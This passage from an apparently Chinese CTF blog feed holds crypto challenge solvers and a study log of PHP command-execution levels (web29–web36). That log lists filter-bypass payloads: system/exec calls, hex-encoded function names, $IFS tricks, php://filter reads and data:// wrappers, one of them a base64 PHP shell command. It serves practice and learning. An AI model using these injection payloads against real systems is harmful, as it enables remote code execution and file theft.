CCTF&#123;h0M3_m4dE_k3Y_Dr1vEn_CrYp7O_5ySTeM!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="jeksign"><a href="#jeksign" class="headerlink" title="jeksign"></a>jeksign</h2><script type="math/tex; mode=display">1337(z^4 - x^2) = 31337(y^2 - z^4)\\a(z^4 - x^2) = b(y^2 - z^4)\\\therefore (a+b)z^4 = ax^2+by^2\\令x=y=z^2，得到恒等式</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">nc = remote(<span class="string">&#x27;02.cr.yp.toc.tf&#x27;</span>, <span class="number">17113</span>)</span><br><span class="line">x = <span class="number">30</span></span><br><span class="line">nc.recvuntil(<span class="string">b&#x27;-bit: \n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    z = randint(<span class="number">2</span> ** (x-<span class="number">1</span>), <span class="number">2</span> ** x)</span><br><span class="line">    <span class="built_in">print</span>(z)</span><br><span class="line">    nc.sendline(<span class="built_in">str</span>(z**<span class="number">2</span>)+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(z**<span class="number">2</span>)  + <span class="string">&#x27;,&#x27;</span> + <span class="built_in">str</span>(z))</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line">    nc.recvline()</span><br><span class="line"><span class="comment">#CCTF&#123;4_diOpH4nT1nE_3Qua7i0n__8Y__Jekuthiel_Ginsbur!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="volgo"><a href="#volgo" class="headerlink" title="volgo"></a>volgo</h2><p>明文密文一一对应，直接爆破</p><p>下面的exp是苏氨酸师傅的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;NUYXA FATCL LJSVD KOLWM NWZUG JZDPY JGOSL CBRGO BAMKL BXDZR BLXDU KUNQE CWEUO SPOZR VOJMM POXCR RPNXX SGVHW TGOWJ BDOGF AHVWF WPZGR UQKUE HASEF GKFFA QOPNQ TESLZ FACTJ JPSPL DNZYN CXSFZ&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rua</span>(<span class="params">c, i</span>):</span></span><br><span class="line">    pre = <span class="string">&quot;A&quot;</span> * i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">        cipher = requests.post(<span class="string">&quot;http://03.cr.yp.toc.tf:11117/m209/encipher&quot;</span>,</span><br><span class="line">                               data=&#123;</span><br><span class="line">                                   <span class="string">&quot;plain&quot;</span>: pre + ch</span><br><span class="line">                               &#125;).json()[<span class="string">&quot;cipher&quot;</span>]</span><br><span class="line"></span><br><span class="line">        cipher = cipher.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)[<span class="number">10</span>:-<span class="number">10</span>]        <span class="comment"># remove head and tail</span></span><br><span class="line">        <span class="built_in">print</span>(cipher)</span><br><span class="line">        <span class="keyword">if</span> cipher[i] == c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;flag[i] is&#x27;</span>, ch)</span><br><span class="line">            <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(ct):</span><br><span class="line">    flag += rua(c, i)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这个是发现了规律的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ciphertext</span>(<span class="params">s</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://03.cr.yp.toc.tf:11117/m209/encipher&quot;</span></span><br><span class="line">    data = &#123; <span class="string">&quot;plain&quot;</span>: s &#125;</span><br><span class="line">    res = requests.post(url, data)</span><br><span class="line">    <span class="keyword">return</span> json.loads(res.text)[<span class="string">&quot;cipher&quot;</span>]</span><br><span class="line"></span><br><span class="line">st = <span class="string">&quot;IISNJ IFFAA TYPMO WDJHA ZMNBD LKUAY TYPVD UGAYU OQMOO YRVUS SLFZI IXKVW LYUGT JWTYV XNEYU HLQVV IXUMJ BKNUQ WMLQT QKIWV UXOCA CVSPG UKJQG XCSFI RJEKU BWLBM AVRFW DMOPT VFXTD VROND XSEHF ZLWEJ VOVSX IISNJ IFFAA&quot;</span></span><br><span class="line"></span><br><span class="line">en = <span class="string">&quot;A&quot;</span> * <span class="number">155</span></span><br><span class="line">en = get_ciphertext(en)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(st))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(en))</span><br><span class="line">res = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(st)):</span><br><span class="line">    <span class="keyword">if</span> st[i] == en[i] <span class="keyword">and</span> st[i] == <span class="string">&quot; &quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    cc = <span class="built_in">bytes</span>([(<span class="built_in">ord</span>(en[i]) - <span class="built_in">ord</span>(st[i])) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Z&quot;</span> == cc:</span><br><span class="line">        res += <span class="string">b&quot; &quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += cc</span><br><span class="line"><span class="built_in">print</span>(res)  </span><br></pre></td></tr></table></figure><p>CCTF{OOJMPMDDIXCLNNWFTEJUMFXKBRVVMOPSLSSLUTXVDVNDMYYPHPWFJRNJBVBOMUYR}</p><h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="Aniely"><a href="#Aniely" class="headerlink" title="Aniely"></a>Aniely</h2><p>key = passphrase^flag</p><p>enc = passphrase ^ E(key)^rand</p><p>rand = urandom(2) * 16</p><p>flag开头两字节为’CC’</p><p>因此rand可求</p><h2 id="Diploma"><a href="#Diploma" class="headerlink" title="Diploma"></a>Diploma</h2><h2 id="Oak-land"><a href="#Oak-land" class="headerlink" title="Oak land"></a>Oak land</h2><h2 id="Cantilever"><a href="#Cantilever" class="headerlink" title="Cantilever"></a>Cantilever</h2><h2 id="Side-step"><a href="#Side-step" class="headerlink" title="Side step"></a>Side step</h2><h2 id="Faonsa"><a href="#Faonsa" class="headerlink" title="Faonsa"></a>Faonsa</h2><h2 id="Resign"><a href="#Resign" class="headerlink" title="Resign"></a>Resign</h2><h2 id="DBB"><a href="#DBB" class="headerlink" title="DBB"></a>DBB</h2><h2 id="Fiercest"><a href="#Fiercest" class="headerlink" title="Fiercest"></a>Fiercest</h2><h2 id="Mino"><a href="#Mino" class="headerlink" title="Mino"></a>Mino</h2><h2 id="Starter-ECC"><a href="#Starter-ECC" class="headerlink" title="Starter ECC"></a>Starter ECC</h2><h1 id="MEDIUM-HARD"><a href="#MEDIUM-HARD" class="headerlink" title="MEDIUM-HARD"></a>MEDIUM-HARD</h1><h2 id="Watery-soup"><a href="#Watery-soup" class="headerlink" title="Watery soup"></a>Watery soup</h2><h2 id="313-Loyal"><a href="#313-Loyal" class="headerlink" title="313 Loyal"></a>313 Loyal</h2><h2 id="Soda"><a href="#Soda" class="headerlink" title="Soda"></a>Soda</h2><h2 id="Sparse"><a href="#Sparse" class="headerlink" title="Sparse"></a>Sparse</h2><h2 id="Larisa"><a href="#Larisa" class="headerlink" title="Larisa"></a>Larisa</h2><h2 id="Shaim"><a href="#Shaim" class="headerlink" title="Shaim"></a>Shaim</h2><h2 id="Lagima"><a href="#Lagima" class="headerlink" title="Lagima"></a>Lagima</h2><h2 id="Versace"><a href="#Versace" class="headerlink" title="Versace"></a>Versace</h2><h1 id="HARD"><a href="#HARD" class="headerlink" title="HARD"></a>HARD</h1><h2 id="Persian-cat"><a href="#Persian-cat" class="headerlink" title="Persian cat"></a>Persian cat</h2><h2 id="NLCS"><a href="#NLCS" class="headerlink" title="NLCS"></a>NLCS</h2><h2 id="GSDP"><a href="#GSDP" class="headerlink" title="GSDP"></a>GSDP</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;复盘咯&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA, math" scheme="http://sh1k4ku.github.io/tags/RSA-math/"/>
    
  </entry>
  
  <entry>
    <title>DSCTF</title>
    <link href="http://sh1k4ku.github.io/2022/07/17/DSCTF/"/>
    <id>http://sh1k4ku.github.io/2022/07/17/DSCTF/</id>
    <published>2022-07-17T03:01:56.000Z</published>
    <updated>2022-07-17T08:54:20.612Z</updated>
    
    <content type="html"><![CDATA[<p>俺拉了</p><span id="more"></span><h1 id="picproblem"><a href="#picproblem" class="headerlink" title="picproblem"></a>picproblem</h1><p>套娃，pell + 逆图片+已知dp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array, zeros, uint8</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="comment"># n =  85413323752199019806030766630760449394238054889872415531186815348349883843039718091361611175963675771467536496812507338620957273406076058263122453235926619595761737396698699834116678598534261542535530241537247151318756003375573850725841254167462648747492270335084402716816450008370008491069875351593380154253</span></span><br><span class="line"><span class="comment"># dp =  1576424214336939000475035870826282526256046059505538052583882122452307602095912733650442447289122473348318614749578285418144935611098423641334952097553125</span></span><br><span class="line"><span class="comment"># c =  53653254613997095145108444611576166902006080900281661447007750088487109015427510365774527924664116641019490904245926171500894236952984157500461367769566121581870986304353174732328118576440353500038670030097108081972287049673200783198844842527470746431369314585103203118824985764754487936404004696485346196488</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for x in range(1, e):</span></span><br><span class="line"><span class="comment"># if(e*dp%x==1):</span></span><br><span class="line"><span class="comment"># p=(e*dp-1)//x+1</span></span><br><span class="line"><span class="comment"># if(n%p!=0):</span></span><br><span class="line"><span class="comment"># continue</span></span><br><span class="line"><span class="comment"># q=n//p</span></span><br><span class="line"><span class="comment"># phin=(p-1)*(q-1)</span></span><br><span class="line"><span class="comment"># d = gp.invert(e, phin)</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(pow(c, d, n)))</span></span><br><span class="line"><span class="comment"># m = b&#x27;*********** kn = 8 **************&#x27;</span></span><br><span class="line">image = cv2.imread(<span class="string">&quot;flag.jpg&quot;</span>)</span><br><span class="line">img_gray = cv2.cvtColor(image,cv2.COLOR_RGB2GRAY)</span><br><span class="line">imagearray = array(img_gray)</span><br><span class="line">h = <span class="built_in">len</span>(imagearray)</span><br><span class="line">w = <span class="built_in">len</span>(imagearray[<span class="number">0</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_pell</span>(<span class="params">N, numTry = <span class="number">1000</span></span>):</span></span><br><span class="line">    cf= continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span>-N*denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer,denom</span><br><span class="line">x, y = solve_pell(<span class="number">903751</span>, <span class="number">2000</span>)</span><br><span class="line">kn = <span class="number">8</span></span><br><span class="line">x = <span class="number">1524993807674193841904821512553946379967374698278296055158206699585083472817489721493862711615915407326315660670541801753616900039772802728925226091475860689682871555641241500183892397513037971186709123629077584204226084524811673794984687840178772052545441242927492902583547355565525538664836516589721942980577095421561886873928634330640979800040574060218872787212426630202508118484269553983399179155489583316400107655564222453437462724749097265122300644936717434151331633092585140183510349369422527440264746843972834927860065578557836150798690530172694679514231722613822246810010130005324032492360889531553803832398604563088256410481865243771216990603166993198935358471831328395618477974126824762560872337594997394218234427050399655270848385995088586420526886397320949350980406936200217112040971433660322179072288438842964957568719036794320203116263329623589339367497303140938070334557345834226085189140858264388063745189833584962825509843279678826240558480527560</span></span><br><span class="line">y = <span class="number">1604145232044543633656616254647708451166351104281510395737885491696385806407267633308545985473789119651681711082023113933085624628557168423578747544761597312012713558891523798820667618256495398479378172124019360339427592449217208805888502769358288779859969965560832505104388955091637704481336716722418336373334467787371085728212260231330510705797124224353810509272250940285165605853594811893804251478850270703294638335268305881655491870226553141286503109543313414279220480589704210363277523457948607498351377843904335637032510420141505975997452077477296326035048463179997347136990808017374750824810458605412236391952910679246288287664717533857743462935708681309073915761377477454479206054016260422865457862565353002789887917196437750618212918420129464330488021272187952177063175896447842395209693304502304253471733746765257510395226972224876277717457205220726240042035259947453816668460757995771018155703600926745905595162857982860955545877343914746294034180707</span></span><br><span class="line"><span class="keyword">assert</span> <span class="number">1301149798051259562945444365741194129602596348352064372203373</span>*<span class="built_in">pow</span>(x, <span class="number">2</span>) == <span class="number">1175915431138623881271508290982969935822476052419526528443170552123</span>*<span class="built_in">pow</span>(y, <span class="number">2</span>) + <span class="number">1301149798051259562945444365741194129602596348352064372203373</span></span><br><span class="line">x1 = <span class="built_in">round</span>(x/y*<span class="number">0.001</span>, <span class="number">16</span>)</span><br><span class="line">u1 = y*<span class="number">3650</span>/x</span><br><span class="line">x2 = <span class="built_in">round</span>(x/y*<span class="number">0.00101</span>, <span class="number">16</span>)</span><br><span class="line">u2 = y*<span class="number">3675</span>/x</span><br><span class="line">x3 = <span class="built_in">round</span>(x/y*<span class="number">0.00102</span>, <span class="number">16</span>)</span><br><span class="line">u3 = y*<span class="number">3680</span>/x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line"><span class="built_in">print</span>(kt)</span><br><span class="line"><span class="built_in">print</span>(h, w)</span><br><span class="line"></span><br><span class="line">temp_image = zeros(shape=[h, w, <span class="number">3</span>], dtype=uint8)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image[<span class="number">0</span>][<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, kn):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, w):</span><br><span class="line">            x1 = u1 * x1 * (<span class="number">1</span> - x1)</span><br><span class="line">            x2 = u2 * x2 * (<span class="number">1</span> - x2)</span><br><span class="line">            x3 = u3 * x3 * (<span class="number">1</span> - x3)</span><br><span class="line">            r1 = <span class="built_in">int</span>(x1 * <span class="number">255</span>)</span><br><span class="line">            r2 = <span class="built_in">int</span>(x2 * <span class="number">255</span>)</span><br><span class="line">            r3 = <span class="built_in">int</span>(x3 * <span class="number">255</span>)</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                temp_image[i][j][t] = (((r1 + r2) ^ r3) - imagearray[i][j]) % <span class="number">256</span></span><br><span class="line">    x1 = kt[<span class="number">0</span>]</span><br><span class="line">    x2 = kt[<span class="number">1</span>]</span><br><span class="line">    x3 = kt[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br></pre></td></tr></table></figure><h1 id="RSA330"><a href="#RSA330" class="headerlink" title="RSA330"></a>RSA330</h1><p><a href="https://eprint.iacr.org/2022/271.pdf#:~:text=The point of approximate divisor multiples is that,we rely on a standard Coppersmith- type heuristic.">paper链接</a></p><p>哎本来能做出来的，最后一直copper不出来，也算督促自己了T-T</p><p>题目分三步，factor-用paper的方法求kl-copper</p><p>第二步和第三步不一定有解</p><p>copper最后得到的小范式单项式用基本方法、groebner都可以出解</p><h1 id="approximate"><a href="#approximate" class="headerlink" title="approximate"></a>approximate</h1><p>RSA copper了一天，这题都没看。。复盘的时候发现不是很难</p><script type="math/tex; mode=display">x_1 = p * pp\\x_2 = q * qq\\n = (p+x)*(q+y)\\\because x、y\; is\;small\\\therefore x_1x_2/n + x \approx pp*qq \;|\;x_1x_2</script><p>不过x的界要自己找</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;俺拉了&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
    <category term="Pell Equation" scheme="http://sh1k4ku.github.io/tags/Pell-Equation/"/>
    
    <category term="coppersmith" scheme="http://sh1k4ku.github.io/tags/coppersmith/"/>
    
  </entry>
  
  <entry>
    <title>web</title>
    <link href="http://sh1k4ku.github.io/2022/07/11/web/"/>
    <id>http://sh1k4ku.github.io/2022/07/11/web/</id>
    <published>2022-07-11T02:11:09.000Z</published>
    <updated>2022-07-18T10:08:18.016Z</updated>
    
    <content type="html"><![CDATA[<p>学点web</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><a href="https://blog.csdn.net/zmx2473162621/article/details/115284712">wp</a></p><p><a href="https://wkr.moe/ctf/447.html#web15%5B%E7%A4%BE%E5%B7%A5%5D">wp2</a></p><p><a href="https://blog.csdn.net/a597934448/article/details/105431367">各种泄露</a></p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p><a href="https://blog.csdn.net/solitudi/article/details/109837640">y4的wp</a></p><p>一些基本提取文件的操作：cat、nl、tac、highlight_file()、vim、vi</p><p>匹配：*多个字符匹配，?单个字符匹配</p><p>转义符：^、””、’’</p><p>执行函数echo()、system()、passthru() 、exec()、 shell_exec()、popen()、proc_open()、pcntl_exec()</p><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>只过滤了flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=system(<span class="string">&quot;nl fla*&quot;</span>);<span class="comment">//匹配</span></span><br><span class="line">c=<span class="keyword">echo</span> `nl fl<span class="string">&#x27;&#x27;</span>ag.php`;<span class="comment">//转义字符</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=system(<span class="string">&#x27;nl flag.php&#x27;</span>);<span class="comment">//因为只过滤c的flag，所以用1传参不会被过滤</span></span><br></pre></td></tr></table></figure><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>过滤了flag、system、php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">&#x27;nl fla?????&#x27;</span>);</span><br></pre></td></tr></table></figure><p>和上一问差不多</p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>过滤了很多，”/flag|system|php|cat|sort|shell|.| |\’/i”（/i大小写不敏感）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=system(<span class="string">&#x27;nl flag.php&#x27;</span>);<span class="comment">//没过滤eval，用1传参</span></span><br><span class="line">c=<span class="keyword">echo</span>(`nl%<span class="number">09</span>fl[abc]*`);<span class="comment">//%09空格转义，[abc]匹配不包含abc的文字</span></span><br><span class="line">c=<span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;nl%09fl[a]*&quot;</span>);<span class="comment">//等价于system()</span></span><br><span class="line">c=<span class="keyword">echo</span>`strings\<span class="variable">$IFS</span>\$<span class="number">9</span>f*`<span class="comment">//\$IFS\$9 win下空格转义</span></span><br></pre></td></tr></table></figure><p>查文件路径的语法：</p><p>首先<code>print_r(scandir(dirname(__FILE__)));</code>查看当前目录下文件</p><p>然后找到flag.php<br><code>print_r(next(array_reverse(scandir(dirname(__FILE__)))));</code><br>之后高亮显示即可<br><code>c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</code></p><p><code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code>和上面的差不多</p><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>过滤的更多了：(“/flag|system|php|cat|sort|shell|.| |\’|`|echo|\;|(/i”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]<span class="meta">?&gt;</span>&amp;url=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php//这个$nice=暂且不知道是干啥的，去掉也能执行</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&quot;cat flag.php&quot;);<span class="meta">?&gt;</span> //伪协议，下一个也是</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/wjrblogs/p/12285202.html">伪协议</a></p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>比32多过滤了个双引号，所以要把“url”改成1：”/flag|system|php|cat|sort|shell|.| |\’|`|echo|\;|(|\”/i”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl flag.php&quot;);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>多了个’:’：”/flag|system|php|cat|sort|shell|.| |\’|`|echo|\;|(|\:|\”/i”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl flag.php&quot;);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>多了小于和等于：”/flag|system|php|cat|sort|shell|.| |\’|`|echo|\;|(|\:|\”|\&lt;|\=/i”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl flag.php&quot;);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>多了数字：”/flag|system|php|cat|sort|shell|.| |\’|`|echo|\;|(|\:|\”|\&lt;|\=|\/|[0-9]/i”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span 